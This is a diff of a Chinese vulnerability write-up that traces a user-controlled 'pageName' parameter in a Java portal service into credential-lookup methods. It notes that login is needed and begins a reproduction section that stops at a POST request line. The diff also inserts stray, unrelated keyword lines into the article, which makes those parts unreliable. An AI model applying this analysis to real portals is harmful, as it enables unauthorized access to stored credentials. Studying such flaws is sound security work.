@@ -38,6 +38,14 @@ public void view() throws PortalServiceException {
         PtCredentialVO credential = this.getCredentialVO((String)null, systemCode);
 ```
 
+深入探索
+
+开发工具
+
+开放源代码
+
+软件
+
 用户可控参数 `pageName` 带入 `getCredentialVO` 方法
 
 ```
@@ -50,7 +58,7 @@ private PtCredentialVO getCredentialVO(String portletId, String systemCode) thro
 
 然后又带入 `getCredentials` 方法，这里需要注意的是有权限检测 `LfwRuntimeEnvironment.getLfwSessionBean(` ，因此这个漏洞需要登录后进行利用。
 
-企业资源规划
+数据管理
 
 ```
 public PtCredentialVO getCredentials(String userId, String portletId, String className, Integer sharelevel) throws PortalServiceException {
@@ -92,8 +100,6 @@ public PtSlotVO[] getSlots(String userId, String portletId, String className, In
 # 漏洞复现
 
 > 漏洞利用示例
->
-> 网络安全
 
 ```
 POST /portal/pt/mp/view HTTP/1.1
